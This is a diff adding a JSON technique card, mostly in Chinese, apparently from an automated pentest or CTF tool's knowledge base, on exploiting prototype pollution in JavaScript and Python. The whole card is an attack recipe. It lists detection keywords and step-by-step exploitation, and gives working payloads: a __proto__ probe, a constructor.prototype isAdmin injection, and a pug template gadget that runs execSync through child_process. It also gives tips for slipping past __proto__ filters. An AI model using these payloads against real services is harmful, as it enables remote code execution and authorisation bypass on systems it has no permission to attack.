@@ -1,0 +1,51 @@
+{
+  "id": "prototype-pollution-to-rce",
+  "title": "原型链污染 → gadget → 提权/RCE",
+  "vuln_pattern": "prototype pollution (JS __proto__ / Python pydash-style) 污染共享原型，注入影响后续逻辑的属性",
+  "fingerprint": [
+    "prototype pollution",
+    "__proto__",
+    "constructor.prototype",
+    "原型链污染",
+    "pydash",
+    "lodash merge",
+    "deep merge",
+    "recursive merge",
+    "set(obj, path",
+    "污染",
+    "远程代码执行",
+    "代码执行",
+    "服务端"
+  ],
+  "exploit_steps": [
+    "定位注入点：能否用 __proto__.x 或 constructor.prototype.x（JS）/ 深合并把键写进共享原型",
+    "先污染一个无害探针属性(如 __proto__.ppprobe=1)，再在另一个响应里确认该属性凭空出现——证明污染全局生效",
+    "找 gadget：污染一个被下游读取的属性——如模板引擎的 options(注入 SSTI 到 pug/handlebars 编译选项)、命令执行库的 shell/env、鉴权中间件的 isAdmin/role",
+    "把 gadget 属性污染成利用值，触发下游路径，拿到 RCE 或权限提升"
+  ],
+  "key_payloads": [
+    "{\"__proto__\":{\"ppprobe\":\"POLLUTED\"}}",
+    "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
+    "污染模板 options 到 SSTI：{\"__proto__\":{\"block\":{\"type\":\"Text\",\"line\":\"process.mainModule.require('child_process').execSync('id')\"}}}"
+  ],
+  "category": "web",
+  "cve": [],
+  "tags": [
+    "web",
+    "prototype-pollution",
+    "rce",
+    "authbypass"
+  ],
+  "source": "original: v2 technique card",
+  "created_ts": 0.0,
+  "preconditions": [
+    "存在把用户可控 JSON/键路径递归合并进对象的逻辑(merge/extend/set by dotted-path)",
+    "后续存在读取未显式设置属性的 gadget(模板引擎选项、命令拼接、权限字段)"
+  ],
+  "verify_oracle": "污染探针属性在无关对象上凭空出现(证明全局生效)；或 gadget 触发后回显 uid= / 命令输出 / isAdmin 生效",
+  "pitfalls": [
+    "很多库对 __proto__ 做了过滤但漏了 constructor.prototype——两者都试",
+    "污染是全局副作用，可能污染其它请求；探针名要唯一",
+    "JSON.parse 的 __proto__ 在纯对象里默认不生效，需目标自身用不安全的深合并"
+  ]
+}
